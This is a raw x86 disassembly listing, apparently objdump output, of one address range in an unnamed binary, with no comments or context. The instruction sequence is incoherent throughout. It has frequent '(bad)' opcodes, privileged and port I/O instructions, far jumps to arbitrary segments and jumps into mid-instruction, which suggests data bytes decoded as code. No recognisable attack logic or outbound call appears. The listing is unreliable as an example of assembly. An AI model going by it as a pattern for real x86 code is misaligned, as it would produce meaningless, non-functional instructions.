  40bed4:	repz lea edx,[ebx]
  40bed7:	in     al,dx
  40bed8:	fcomi  st,st(7)
  40beda:	jge    0x40bf0f
  40bedc:	xchg   edx,eax
  40bedd:	xor    eax,0xfc1ff1f0
  40bee2:	xchg   edi,eax
  40bee3:	pusha  
  40bee4:	test   eax,0x8568f855
  40bee9:	pop    ss
  40beea:	or     al,0x58
  40beec:	adc    al,0xb6
  40beee:	or     edi,DWORD PTR [edi]
  40bef0:	mov    edi,0x2ad7c52f
  40bef5:	(bad)  
  40bef6:	jmp    0x584a:0xdc4963d2
  40befd:	bound  ecx,QWORD PTR [eax+0x1996cde7]
  40bf03:	cdq    
  40bf04:	popa   
  40bf05:	enter  0x5c92,0x11
  40bf09:	dec    ebx
  40bf0a:	dec    edx
  40bf0b:	cli    
  40bf0c:	or     al,0x63
  40bf0e:	xchg   ecx,eax
  40bf0f:	cmp    eax,0x2f46a9a2
  40bf14:	out    dx,al
  40bf15:	ja     0x40bee0
  40bf17:	push   ds
  40bf18:	add    DWORD PTR [edi+eax*1],edx
  40bf1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf1c:	dec    ebx
  40bf1d:	adc    DWORD PTR [eax],edi
  40bf1f:	(bad)  
  40bf20:	push   ds
  40bf21:	mov    ah,0x4b
  40bf23:	fsub   DWORD PTR [ebx+0x69]
  40bf26:	fdivr  DWORD PTR [ebx]
  40bf28:	push   esp
  40bf29:	dec    esi
  40bf2a:	fstp   DWORD PTR [edx-0x6613e7a1]
  40bf30:	aas    
  40bf31:	or     esp,DWORD PTR [edi]
  40bf33:	sti    
  40bf34:	fidivr DWORD PTR [ecx-0x39]
  40bf37:	sub    DWORD PTR [ebx],ecx
  40bf39:	adc    DWORD PTR [edi+0x2ace3a19],edi
  40bf3f:	or     eax,0xdec0e5bc
  40bf44:	mov    DWORD PTR [ebx-0x62],eax
  40bf47:	dec    ecx
  40bf48:	push   ds
  40bf49:	mov    cl,0xc8
  40bf4b:	ins    BYTE PTR es:[edi],dx
  40bf4c:	xor    cl,0xa4
  40bf4f:	pop    ebx
  40bf50:	icebp  
  40bf51:	outs   dx,BYTE PTR ds:[esi]
  40bf52:	in     al,dx
  40bf53:	mov    BYTE PTR [edi+0xd9a6dc1],cl
  40bf59:	js     0x40bfb0
  40bf5b:	ins    DWORD PTR es:[edi],dx
  40bf5c:	push   ebx
  40bf5d:	call   0xf773d3a3
  40bf62:	lock jmp 0xc070:0x6dc45cc5
  40bf6a:	sbb    esi,esi
  40bf6c:	adc    al,0x5f
  40bf6e:	push   ds
  40bf6f:	test   DWORD PTR [ebx-0x35],esp
  40bf72:	sub    al,0x18
  40bf74:	xchg   DWORD PTR [eax+0x33],esi
  40bf77:	out    0x4b,eax
  40bf79:	(bad)  
  40bf7a:	nop
  40bf7b:	jl     0x40bf5c
  40bf7d:	mov    ds:0xcb56e9e,al
  40bf82:	pusha  
  40bf83:	or     dl,ah
  40bf85:	into   
  40bf86:	pop    es
  40bf87:	and    al,BYTE PTR [edx-0x1f]
  40bf8a:	pop    ecx
  40bf8b:	and    eax,0xfd51a72c
  40bf90:	ss mov dh,0x45
  40bf93:	fwait
  40bf94:	adc    eax,0xead5e2eb
  40bf99:	mov    es,WORD PTR [eax+0x20]
  40bf9c:	std    
  40bf9d:	pop    DWORD PTR [eax]
  40bf9f:	imul   esp,DWORD PTR [ecx-0x137d0765],0x3a
  40bfa6:	jecxz  0x40bf28
  40bfa8:	cli    
  40bfa9:	das    
  40bfaa:	add    DWORD PTR [esi],edx
  40bfac:	int3   
  40bfad:	xchg   edx,eax
  40bfae:	into   
  40bfaf:	adc    BYTE PTR [eax+eax*2+0x4e2009f2],0xa7
  40bfb7:	stos   DWORD PTR es:[edi],eax
  40bfb8:	inc    esp
  40bfb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfba:	mov    DWORD PTR [bx+di-0x5c],ebp
  40bfbe:	mov    ?,WORD PTR [esp+edi*4+0x7e]
  40bfc2:	pop    ss
  40bfc3:	leave  
  40bfc4:	js     0x40bf5b
  40bfc6:	mov    eax,0x51bfcefc
  40bfcb:	inc    ecx
  40bfcc:	rcl    BYTE PTR [esp+eiz*4],0x6d
  40bfd0:	stos   BYTE PTR es:[edi],al
  40bfd1:	pop    esp
  40bfd2:	retf   0xc226
  40bfd5:	add    cl,BYTE PTR [edx-0x1e17a0b3]
  40bfdb:	std    
  40bfdc:	(bad)  
  40bfdd:	inc    bl
  40bfdf:	pop    eax
  40bfe0:	push   ebx
  40bfe1:	add    DWORD PTR [esi],eax
  40bfe3:	fisttp QWORD PTR [ecx]
  40bfe5:	or     ecx,edx
  40bfe7:	ins    DWORD PTR es:[edi],dx
  40bfe8:	popa   
  40bfe9:	and    bl,dh
  40bfeb:	es xchg ebp,eax
  40bfed:	push   edx
  40bfee:	sbb    al,0xce
  40bff0:	or     ecx,edx
  40bff2:	adc    ah,al
  40bff4:	loope  0x40c043
  40bff6:	push   ds
  40bff7:	test   al,0xb9
  40bff9:	mov    cl,0x8b
  40bffb:	add    eax,0x697e96ea
  40c000:	(bad)  
  40c001:	jmp    0x40bfec
  40c003:	(bad)  
  40c004:	popa   
  40c005:	add    eax,0x78018423
  40c00a:	pop    es
  40c00b:	sbb    bl,bl
  40c00d:	mov    esi,0x56b6912f
  40c012:	inc    esi
  40c013:	shl    BYTE PTR [eax+edi*2-0x4],cl
  40c017:	fcom   DWORD PTR [ecx+0x6917e86b]
  40c01d:	mov    eax,ds:0xcef811c2
  40c022:	lds    ecx,FWORD PTR [ebp-0x6d]
  40c025:	mov    WORD PTR ds:0x87c46eb3,gs
  40c02b:	jb     0x40c082
  40c02d:	sbb    al,0x43
  40c02f:	sar    BYTE PTR ds:0xc41e1f1c,1
  40c035:	inc    esi
  40c036:	or     al,BYTE PTR [esp+ecx*8-0x20e5df62]
  40c03d:	hlt    
  40c03e:	icebp  
  40c03f:	hlt    
  40c040:	mov    al,ds:0x6be7fb76
  40c045:	enter  0x39ff,0x60
  40c049:	clc    
  40c04a:	jne    0x40c07e
  40c04c:	arpl   WORD PTR [esi],ax
  40c04e:	stos   BYTE PTR es:[edi],al
  40c04f:	jbe    0x40c06d
  40c051:	push   es
  40c052:	in     eax,dx
  40c053:	mov    ecx,0xc355b07
  40c058:	sub    BYTE PTR [edx],cl
  40c05a:	xor    edi,DWORD PTR [ebx+edi*8]
  40c05d:	std    
  40c05e:	xchg   ebp,eax
  40c05f:	dec    eax
  40c060:	jg     0x40c012
  40c062:	fisttp DWORD PTR [esi]
  40c064:	sbb    DWORD PTR [bx+si],0x38
  40c068:	iret   
  40c069:	out    0x4,al
  40c06b:	sbb    BYTE PTR [edi-0x38f07b2e],ch
  40c071:	cdq    
  40c072:	add    DWORD PTR [edi-0x257d1048],esi
  40c078:	(bad)  
  40c079:	mov    bl,0xa3
  40c07b:	fs dec esi
  40c07d:	or     BYTE PTR [ebx+0x46f0eb8b],bh
  40c083:	xchg   dl,ch
  40c085:	and    esi,0x80bcb97f
  40c08b:	jmp    0xc576355
  40c090:	lock in al,dx
  40c092:	ret    0xdcd6
  40c095:	popf   
  40c096:	add    DWORD PTR [ebx],ebx
  40c098:	inc    eax
  40c099:	xchg   edx,eax
  40c09a:	int    0x50
  40c09c:	mov    eax,ds:0xc1e09387
  40c0a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0a2:	sub    DWORD PTR ds:0x900a90c,ebx
  40c0a8:	inc    ebx
  40c0a9:	scas   al,BYTE PTR es:[edi]
  40c0aa:	push   edx
  40c0ab:	xor    DWORD PTR [ebx],0x48
  40c0ae:	fs retf 0xc87a
  40c0b2:	add    al,al
  40c0b4:	or     edx,ebp
  40c0b6:	int3   
  40c0b7:	cli    
  40c0b8:	xor    DWORD PTR [esi+0x73],0xd67ff200
  40c0bf:	setl   bh
  40c0c2:	(bad)  
  40c0c5:	scas   eax,DWORD PTR es:[edi]
  40c0c6:	js     0x40c0dd
  40c0c8:	call   0x330:0x6289eed0
  40c0cf:	inc    esp
  40c0d0:	call   0xce90:0x159d6c57
  40c0d7:	cs aam 0x85
  40c0da:	pop    ds
  40c0db:	(bad)
  40c0de:	lods   eax,DWORD PTR ds:[esi]
  40c0df:	fsub   QWORD PTR [ecx-0x7f]
  40c0e2:	dec    edx
  40c0e3:	mov    esp,0xd7959c34
  40c0e8:	cld    
  40c0e9:	cdq    
  40c0ea:	into   
  40c0eb:	inc    ebx
  40c0ec:	fadd   QWORD PTR [esp+edx*8-0x63b63649]
  40c0f3:	push   cs
  40c0f4:	add    ch,BYTE PTR [edx-0x1b6e3478]
  40c0fa:	sbb    eax,0x581e911f
  40c0ff:	out    dx,eax
  40c100:	dec    ebx
  40c101:	ss xor cl,al
  40c104:	fbstp  TBYTE PTR [ebx+0xc]
  40c107:	inc    eax
  40c108:	mov    dl,0x31
  40c10a:	jp     0x40c09d
  40c10c:	sbb    esp,DWORD PTR [eax]
  40c10e:	jmp    0x40c0cc
  40c110:	jl     0x40c0ad
  40c112:	and    esi,DWORD PTR [eax+0x42]
  40c115:	leave  
  40c116:	mov    eax,0x9f4c5742
  40c11b:	rol    BYTE PTR [edx-0x50],cl
  40c11e:	push   es
  40c11f:	add    BYTE PTR [edx+0x5e],ch
  40c122:	mov    dl,0xa4
  40c124:	push   ecx
  40c125:	dec    ebp
  40c126:	xor    edx,DWORD PTR [ebx-0x1]
  40c129:	adc    edx,esi
  40c12b:	mov    ecx,0xde5c10f0
  40c130:	sbb    ch,BYTE PTR [ebx+0xd]
  40c133:	jae    0x40c0f2
  40c135:	xchg   DWORD PTR [eax],edi
  40c137:	sar    ah,0x84
  40c13a:	mov    ch,BYTE PTR [ebp+0x7f]
  40c13d:	dec    ebx
  40c13e:	outs   dx,DWORD PTR ds:[esi]
  40c13f:	inc    ecx
  40c140:	inc    esp
  40c141:	cld    
  40c142:	mov    ebx,0x423076f3
  40c147:	mov    eax,0x56763941
  40c14c:	mov    al,ds:0x5ccaf98
  40c151:	data16 (bad) 
  40c153:	cld    
  40c154:	repnz xor ebx,DWORD PTR [esp+edi*4+0x10439ebe]
  40c15c:	imul   ebx,DWORD PTR [ebx-0x7d],0x39
  40c160:	xor    BYTE PTR [esi],0x74
  40c163:	adc    DWORD PTR [eax],edx
  40c165:	jbe    0x40c119
  40c167:	jecxz  0x40c123
  40c169:	dec    edx
  40c16a:	jns    0x40c0fe
  40c16c:	pop    ss
  40c16d:	add    eax,0xd6b55826
  40c172:	or     esi,ecx
  40c174:	inc    esi
  40c175:	call   0x4d78:0x1a90712e
  40c17c:	(bad)  
  40c17d:	lock push ebx
  40c17f:	pop    ecx
  40c180:	push   0x612b8603
  40c185:	pmaxsw mm5,QWORD PTR ds:0x644aef48
  40c18c:	pop    esi
  40c18d:	sahf   
  40c18e:	fwait
  40c18f:	sub    al,0x3
  40c191:	gs icebp 
  40c193:	les    esp,FWORD PTR ds:0xdef77579
  40c199:	cmovns ebp,edi
  40c19c:	and    ecx,edx
  40c19e:	xchg   edi,eax
  40c19f:	add    al,0x41
  40c1a1:	int3   
  40c1a2:	push   esp
  40c1a3:	and    eax,0x8e2b8d09
  40c1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a9:	imul   esp,DWORD PTR [ebx+0x50],0x6e
  40c1ad:	leave  
  40c1ae:	fdivr  DWORD PTR [edx]
  40c1b1:	arpl   WORD PTR [ecx-0x1dabf721],cx
  40c1b7:	lock xchg esi,eax
  40c1b9:	and    eax,0x4a7203b9
  40c1be:	icebp  
  40c1bf:	lock imul ebp,DWORD PTR [eax-0x3c024c1d],0x58794a62
  40c1ca:	and    al,0xf9
  40c1cc:	inc    edx
  40c1cd:	stos   DWORD PTR es:[edi],eax
  40c1ce:	mov    ebp,0x62ef44df
  40c1d3:	pusha  
  40c1d4:	outs   dx,DWORD PTR ds:[esi]
  40c1d5:	sbb    eax,0xb45a6e50
  40c1da:	jo     0x40c1e4
  40c1dc:	dec    ebx
  40c1dd:	and    BYTE PTR [edx],bh
  40c1df:	push   esp
  40c1e0:	cdq    
  40c1e1:	aas    
  40c1e2:	pusha  
  40c1e3:	test   eax,0xfaedb71d
  40c1e8:	ins    BYTE PTR es:[edi],dx
  40c1e9:	lods   al,BYTE PTR ds:[esi]
  40c1ea:	fucom  st(4)
  40c1ec:	rcl    BYTE PTR [ebx],1
  40c1ee:	push   ebx
  40c1ef:	shl    BYTE PTR [ecx],1
  40c1f1:	sahf   
  40c1f2:	xor    cl,BYTE PTR [edi+0x683cd5da]
  40c1f8:	adc    eax,0xcca7a997
  40c1fd:	mov    ds:0x4d9fb0f0,al
  40c202:	push   esp
  40c203:	(bad)  
  40c204:	or     al,0xe7
  40c206:	jnp    0x40c23b
  40c208:	or     ebp,DWORD PTR [esi+0x4cdd8a68]
  40c20e:	rol    BYTE PTR ds:0x43ccfce3,1
  40c214:	push   0xffffffc9
  40c216:	cmp    WORD PTR ds:0xde7f897d,dx
  40c21d:	out    dx,al
  40c21e:	mov    edi,0x6d7d9788
  40c223:	aaa    
  40c224:	imul   ebp,DWORD PTR [ebx+eax*4+0x6a111e94],0x59
  40c22c:	dec    esp
  40c22d:	push   ds
  40c22e:	xchg   edx,eax
  40c22f:	or     BYTE PTR [edi+0x305e9405],0x6c
  40c236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c237:	add    ch,BYTE PTR [eax-0x5c]
  40c23a:	push   cs
  40c23b:	stos   DWORD PTR es:[edi],eax
  40c23c:	out    dx,eax
  40c23d:	mov    eax,0xc603f1d4
  40c242:	adc    eax,0xda8b5d0c
  40c247:	retf   0xe9df
  40c24a:	mov    cl,dh
  40c24c:	add    eax,0x28248dff
  40c251:	lock pop edi
  40c253:	pop    edi
  40c254:	inc    ebp
  40c255:	adc    eax,0x21871fda
  40c25a:	pop    esi
  40c25b:	pop    eax
  40c25c:	pop    edi
  40c25d:	xor    al,0x66
  40c25f:	xchg   esp,eax
  40c260:	aaa    
  40c261:	popa   
  40c262:	pop    esp
  40c263:	(bad)  
  40c264:	out    0x95,eax
  40c266:	fdiv   QWORD PTR [eax+0x7d]
  40c269:	test   eax,0x318cc553
  40c26e:	xor    dl,bh
  40c270:	lahf   
  40c271:	add    bh,BYTE PTR [ebx-0x7a9df674]
  40c277:	jg     0x40c2d3
  40c279:	xchg   BYTE PTR [edi-0x24],bh
  40c27c:	and    BYTE PTR [edx+0x3a74443b],ch
  40c282:	add    al,0x2a
  40c284:	inc    ebx
  40c285:	fucom  st(5)
  40c287:	sub    edi,ebp
  40c289:	mov    WORD PTR [eax+0x3847083f],es
  40c28f:	mov    eax,0xfeae1af0
  40c294:	retf   
  40c295:	and    esp,DWORD PTR [esi]
  40c297:	or     BYTE PTR [edx-0x5e27e964],ah
  40c29d:	test   eax,0x8671c480
  40c2a2:	sti    
  40c2a3:	jns    0x40c2f5
  40c2a5:	adc    eax,0xa8029a94
  40c2aa:	sbb    eax,0xf4e4714
  40c2af:	xchg   esi,eax
  40c2b0:	add    ah,BYTE PTR [ebx-0x58]
  40c2b3:	jmp    0xccf9b8de
  40c2b8:	mov    ds:0x6a8ad413,al
  40c2bd:	mov    cl,0x30
  40c2bf:	mov    ah,BYTE PTR [edx]
  40c2c1:	add    DWORD PTR [eax],ebx
  40c2c3:	mov    ebp,0x14e06951
  40c2c8:	add    eax,0x3630e6b4
  40c2cd:	adc    BYTE PTR [edi],bl
  40c2cf:	jns    0x40c265
  40c2d1:	std    
  40c2d2:	inc    ebx
  40c2d3:	imul   edi,edi,0xffffff85
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	daa    
  40c2d8:	add    DWORD PTR [eax-0x65374b01],esp
  40c2de:	addr16 sbb al,0x4b
  40c2e1:	xchg   al,bh
  40c2e3:	shr    dl,1
  40c2e5:	mov    edi,0x47d6345
  40c2ea:	aad    0x3b
  40c2ec:	retf   
  40c2ed:	nop
  40c2ee:	nop
  40c2ef:	add    DWORD PTR [edx+0x72],esp
  40c2f2:	int    0xab
  40c2f4:	mov    esp,0xdbedf663
  40c2f9:	loopne 0x40c2d1
  40c2fb:	dec    esi
  40c2fc:	popa   
  40c2fd:	jo     0x40c2f0
  40c2ff:	xchg   esp,eax
  40c300:	mov    al,0x9c
  40c302:	leave  
  40c303:	mov    DWORD PTR [ebx],ebp
  40c305:	and    DWORD PTR [edi-0x20],esi
  40c308:	cmc    
  40c309:	add    al,0xc8
  40c30b:	sub    DWORD PTR [ecx],eax
  40c30d:	rcl    DWORD PTR [edx],1
  40c30f:	jnp    0x40c29a
  40c311:	jno    0x40c2b4
  40c313:	mov    edx,DWORD PTR [eax]
  40c315:	cmp    BYTE PTR [esp+esi*1-0x5d],al
  40c319:	ds pop esp
  40c31c:	jmp    0x218c:0x6d9c67b1
  40c323:	push   ecx
  40c324:	mov    eax,ds:0x64624a09
  40c329:	mov    ds:0x6aff18ce,eax
  40c32e:	loop   0x40c2c2
  40c330:	pop    ebx
  40c331:	or     eax,0x5bf54360
  40c336:	mov    esi,0xf7baac03
  40c33b:	fisttp WORD PTR [ecx-0x3381304f]
  40c341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c342:	xchg   ebp,eax
  40c343:	push   0xffffffd9
  40c345:	ror    DWORD PTR [ebx-0x582788a6],1
  40c34b:	mov    DWORD PTR [eax-0x4004d725],esi
  40c351:	(bad)  
  40c352:	mov    eax,ds:0x7d206d93
  40c357:	out    dx,eax
  40c358:	cmp    DWORD PTR [bx+si+0x5a],esp
  40c35c:	(bad)  
  40c35d:	push   ds
  40c35e:	adc    DWORD PTR [ebx],eax
  40c360:	xchg   cl,ch
  40c362:	test   eax,0xc8f29a45
  40c367:	in     eax,dx
  40c368:	jae    0x40c309
  40c36a:	add    ebp,DWORD PTR [esi-0x404e5e25]
  40c370:	lods   eax,DWORD PTR ds:[esi]
  40c371:	mov    esi,0x20cc5e1f
  40c376:	cli    
  40c377:	add    bl,bh
  40c379:	inc    edi
  40c37a:	cmc    
  40c37b:	ret    
  40c37c:	or     BYTE PTR [eax+ebp*8-0x71],bl
  40c380:	gs sbb eax,0x4937f993
  40c386:	test   BYTE PTR [ebp+0x7b],ch
  40c389:	sti    
  40c38a:	sub    BYTE PTR [eax+0x47],cl
  40c38d:	sub    edx,esi
  40c38f:	psubusb mm2,QWORD PTR [eax+0x78528c66]
  40c396:	cs jns 0x40c34c
  40c399:	add    dh,BYTE PTR [ecx]
  40c39b:	in     al,0xba
  40c39d:	add    al,0x37
  40c39f:	mov    BYTE PTR [eax-0x4a62d7ef],dl
  40c3a5:	fstp   TBYTE PTR [ebp-0x5f7b92d4]
  40c3ab:	dec    eax
  40c3ac:	sub    BYTE PTR [esi+0x4459cbb8],bh
  40c3b2:	retf   
  40c3b3:	fidiv  WORD PTR [ecx+0x5a23c799]
  40c3b9:	inc    esi
  40c3ba:	sbb    BYTE PTR [edi-0x67f5ff0b],dh
  40c3c0:	jae    0x40c350
  40c3c2:	fwait
  40c3c3:	icebp  
  40c3c4:	xor    ebp,ecx
  40c3c6:	in     al,0x1c
  40c3c8:	inc    edx
  40c3c9:	lods   eax,DWORD PTR ds:[esi]
  40c3ca:	repz push edx
  40c3cc:	push   ebp
  40c3cd:	les    edx,FWORD PTR [edx]
  40c3cf:	arpl   di,dx
  40c3d1:	xor    BYTE PTR [esi+0x4b2c1130],al
  40c3d7:	push   ebx
  40c3d8:	sqrtps xmm2,xmm7
  40c3db:	dec    edi
  40c3dc:	adc    dl,BYTE PTR [ecx]
  40c3de:	stos   BYTE PTR es:[edi],al
  40c3df:	aad    0xe5
  40c3e1:	add    eax,0x47e2a503
  40c3e6:	jle    0x40c37f
  40c3e8:	mov    al,ds:0x1a87e865
  40c3ed:	or     DWORD PTR [eax],esi
  40c3ef:	inc    eax
  40c3f0:	mov    bh,0xc8
  40c3f2:	shl    BYTE PTR [ebp+0x24],1
  40c3f5:	mov    dh,0xe9
  40c3f7:	sub    BYTE PTR [eax-0x43bbd5c8],dl
  40c3fd:	xchg   esp,eax
  40c3fe:	push   ds
  40c3ff:	mov    eax,0xe79cff7b
  40c404:	ins    DWORD PTR es:[edi],dx
  40c405:	cwde   
  40c406:	add    dl,ah
  40c408:	aaa    
  40c409:	or     bh,dh
  40c40b:	rcr    ch,1
  40c40d:	xchg   cl,ch
  40c40f:	mov    al,ds:0x1bb1751b
  40c414:	cmc    
  40c415:	iret   
  40c416:	rcl    bh,cl
  40c418:	outs   dx,DWORD PTR ds:[esi]
  40c419:	or     eax,esi
  40c41b:	sbb    cl,BYTE PTR ds:0x46b25220
  40c421:	mov    WORD PTR [ebx+0x7b26dd43],ds
  40c427:	sbb    ecx,DWORD PTR [edx-0xb9d1919]
  40c42d:	stos   DWORD PTR es:[edi],eax
  40c42e:	dec    esi
  40c42f:	mov    dh,0xde
  40c431:	or     ebx,esi
  40c433:	scas   eax,DWORD PTR es:[edi]
  40c434:	xlat   BYTE PTR ds:[ebx]
  40c435:	pop    ebx
  40c436:	rcl    ebx,cl
  40c438:	mov    dl,0x5b
  40c43a:	fisttp WORD PTR [eax-0x789141b7]
  40c440:	pusha  
  40c441:	dec    ecx
  40c442:	add    BYTE PTR [ebx],0xe
  40c445:	cld    
  40c446:	push   ss
  40c447:	cwde   
  40c448:	mov    al,ds:0x91864986
  40c44d:	cmp    cl,BYTE PTR [ecx]
  40c44f:	mov    ah,0x6f
  40c451:	(bad)  
  40c452:	and    al,0x94
  40c454:	cmp    al,0x1f
  40c456:	and    bl,BYTE PTR [ebx-0x72]
  40c459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c45a:	jl     0x40c49a
  40c45c:	ins    BYTE PTR es:[edi],dx
  40c45d:	push   cs
  40c45e:	data16 fmul st,st(6)
  40c461:	jle    0x40c4b4
  40c463:	es pop ds
  40c465:	mov    edx,0xfcaccee1
  40c46a:	and    al,BYTE PTR [eax]
  40c46c:	sub    ch,BYTE PTR [ebx-0x1787c1]
  40c472:	push   DWORD PTR [ecx+0x46eb345d]
  40c478:	xlat   BYTE PTR ds:[ebx]
  40c479:	mov    bh,BYTE PTR [esi]
  40c47b:	push   ds
  40c47c:	rcl    BYTE PTR [esi-0x5cd6a254],cl
  40c482:	repz xchg edi,eax
  40c484:	sbb    dl,dh
  40c486:	mov    DWORD PTR [ebx+eax*2],ebp
  40c489:	stos   BYTE PTR es:[edi],al
  40c48a:	or     al,0x9
  40c48c:	xor    al,BYTE PTR [edi-0x25]
  40c48f:	rcr    BYTE PTR [edx],1
  40c491:	push   ebp
  40c492:	ror    DWORD PTR [edx+0x63],1
  40c495:	dec    esp
  40c496:	pslld  mm0,QWORD PTR [ecx]
  40c499:	fcom   DWORD PTR ds:[ebp-0x2432baf2]
  40c4a0:	xchg   ebp,eax
  40c4a1:	adc    DWORD PTR [eax+0x156d3bbc],0xabfc5e7c
  40c4ab:	cmp    al,BYTE PTR [edx-0x12]
  40c4ae:	cmp    BYTE PTR [eax],ah
  40c4b0:	mov    cl,0x62
  40c4b2:	jmp    0xfd64:0x1ef51c4d
  40c4b9:	sbb    al,0xa0
  40c4bb:	ds mov eax,0xd29afd0d
  40c4c1:	push   ebx
  40c4c2:	push   edx
  40c4c3:	inc    ebx
  40c4c4:	aaa    
  40c4c5:	stc    
  40c4c6:	call   0xefb98c0e
  40c4cb:	rcr    BYTE PTR [ecx-0x2],cl
  40c4ce:	sbb    DWORD PTR [ebp+0x33],eax
  40c4d1:	jnp    0x40c497
  40c4d3:	sbb    BYTE PTR [edi+0x3f1bcd39],0x26
  40c4da:	jecxz  0x40c4b1
  40c4dc:	jb     0x40c461
  40c4de:	cli    
  40c4df:	fistp  DWORD PTR [esi]
  40c4e1:	xor    DWORD PTR [ebp+0x57],edi
  40c4e4:	jecxz  0x40c49c
  40c4e6:	push   es
  40c4e7:	fadd   st,st(1)
  40c4e9:	and    ebp,DWORD PTR [eax+0x14b98667]
  40c4ef:	mov    esp,0x1cedbc2b
  40c4f4:	into   
  40c4f5:	cmp    bh,BYTE PTR [esi+0x10]
  40c4f8:	xchg   edx,eax
  40c4f9:	dec    edx
  40c4fa:	jbe    0x40c496
  40c4fc:	sbb    DWORD PTR [esi+ebx*8+0x475f4e53],ebx
  40c503:	add    dh,BYTE PTR [edx+0x2c]
  40c506:	mov    ds:0x7c3c0cb6,al
  40c50b:	mov    dh,0x69
  40c50d:	in     eax,dx
  40c50e:	in     eax,dx
  40c50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c510:	lock repz jb 0x40c497
  40c514:	mov    dh,0x31
  40c516:	gs iret 
  40c518:	pop    ebp
  40c519:	out    dx,al
  40c51a:	nop
  40c51b:	sbb    esp,ebx
  40c51d:	or     eax,0x5e070133
  40c522:	in     eax,dx
  40c523:	dec    ebp
  40c524:	(bad)  
  40c525:	cwde   
  40c526:	cmc    
  40c527:	in     eax,0xeb
  40c529:	sar    DWORD PTR [edi+eax*2-0x539cdd37],1
  40c530:	repnz retf 
  40c532:	sbb    edi,DWORD PTR [edi+0x762b6ed6]
  40c538:	shl    ebp,1
  40c53a:	mov    DWORD PTR [eax+edi*4+0x2c],0xe359f8a0
  40c542:	sbb    ch,bl
  40c544:	adc    BYTE PTR [ebx-0x4b],dh
  40c547:	cld    
  40c548:	xchg   edx,eax
  40c549:	mov    ah,0x17
  40c54b:	out    dx,al
  40c54c:	sub    BYTE PTR [ebx],bh
  40c54e:	loopne 0x40c4db
  40c550:	sub    ecx,eax
  40c552:	xchg   DWORD PTR [ebx+0x6d],edi
  40c555:	in     eax,dx
  40c556:	in     eax,0x20
  40c558:	push   edx
  40c559:	int3   
  40c55a:	sbb    eax,0x16fd537d
  40c55f:	ja     0x40c4e2
  40c561:	pop    ecx
  40c562:	adc    eax,0x59827c61
  40c567:	jge    0x40c4e9
  40c569:	sub    al,0x76
  40c56b:	lods   eax,DWORD PTR ds:[esi]
  40c56c:	jecxz  0x40c5d9
  40c56e:	sti    
  40c56f:	addr16 ja 0x40c5bd
  40c572:	or     DWORD PTR [ebx+0x7d],esp
  40c575:	cmp    DWORD PTR [edx-0x32],esi
  40c578:	aaa    
  40c579:	pop    ecx
  40c57a:	or     DWORD PTR ds:0xcb4b8154,0x645ae12f
  40c584:	sub    DWORD PTR [edx],esi
  40c586:	mov    edx,0x6d7bc4dc
  40c58b:	and    eax,0x135a834f
  40c590:	arpl   WORD PTR [ecx],di
  40c592:	repnz in al,0xc3
  40c595:	iret   
  40c596:	inc    esi
  40c597:	jae    0x40c587
  40c599:	dec    ebx
  40c59a:	test   BYTE PTR [esi+edi*4+0x4],0x11
  40c59f:	add    BYTE PTR [esi+0x122d384f],bh
  40c5a5:	js     0x40c617
  40c5a7:	outs   dx,BYTE PTR ds:[esi]
  40c5a8:	(bad)
  40c5ab:	jl     0x40c599
  40c5ad:	test   BYTE PTR [ecx-0x3e],bl
  40c5b0:	sar    DWORD PTR [ebx+0x27],cl
  40c5b3:	mov    bl,BYTE PTR [edx-0x28895f71]
  40c5b9:	iret   
  40c5ba:	and    al,0xe5
  40c5bc:	push   edi
  40c5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5be:	pop    ebp
  40c5bf:	inc    esp
  40c5c0:	push   0xffffffbc
  40c5c2:	out    0xfc,eax
  40c5c4:	jnp    0x40c585
  40c5c6:	adc    al,0xdb
  40c5c8:	push   0xffffff8a
  40c5ca:	leave  
  40c5cb:	mov    edx,0x6daf5346
  40c5d0:	cmp    BYTE PTR [ebp+0x55],dh
  40c5d3:	call   0x93d3:0x2007f6e5
  40c5da:	iret   
  40c5db:	out    dx,eax
  40c5dc:	int    0x17
  40c5de:	and    BYTE PTR [edx-0x47],bh
  40c5e1:	(bad)  
  40c5e2:	mov    ecx,0x16dfa3e7
  40c5e7:	cdq    
  40c5e8:	or     al,0x1c
  40c5ea:	jg     0x40c629
  40c5ec:	cmp    al,0xbb
  40c5ee:	inc    esp
  40c5ef:	mov    db3,esp
  40c5f2:	xchg   eax,esp
  40c5f4:	dec    ecx
  40c5f5:	mov    ah,0x3
  40c5f7:	add    BYTE PTR [ebx+0x50],bl
  40c5fa:	or     eax,0xf0d012fc
  40c5ff:	push   eax
  40c600:	retf   
  40c601:	std    
  40c602:	in     al,dx
  40c603:	loopne 0x40c65a
  40c605:	dec    edx
  40c606:	pop    esp
  40c607:	pop    esp
  40c608:	in     al,0xb5
  40c60a:	push   0xdf0a5d28
  40c60f:	xchg   edi,eax
  40c610:	rcl    ebx,0x53
  40c613:	cmp    al,0xd1
  40c615:	adc    ah,cl
  40c617:	dec    esi
  40c618:	mov    al,ds:0xb3e4a64f
  40c61d:	push   esp
  40c61e:	repnz rcr DWORD PTR [ebx],0x46
  40c622:	scas   eax,DWORD PTR es:[edi]
  40c623:	lea    edi,[esi+eax*2]
  40c626:	dec    edi
  40c627:	les    edi,FWORD PTR [ebp-0x77add1b3]
  40c62d:	push   ss
  40c62e:	add    ebx,esi
  40c630:	inc    ebp
  40c631:	int    0x82
  40c633:	stc    
  40c634:	adc    bp,cx
  40c637:	fisub  DWORD PTR [ebp+0x74]
  40c63a:	hlt    
  40c63b:	and    eax,0x60d923a0
  40c640:	into   
  40c641:	mov    ecx,DWORD PTR [edx]
  40c643:	jl     0x40c6a8
  40c645:	dec    eax
  40c646:	int3   
  40c647:	jge    0x40c6a9
  40c649:	loopne 0x40c5db
  40c64b:	or     ebp,DWORD PTR [ebp+ebx*4+0x75c27366]
  40c652:	cld    
  40c653:	xlat   BYTE PTR ds:[ebx]
  40c654:	lock add DWORD PTR [esi+0x79],eax
  40c658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
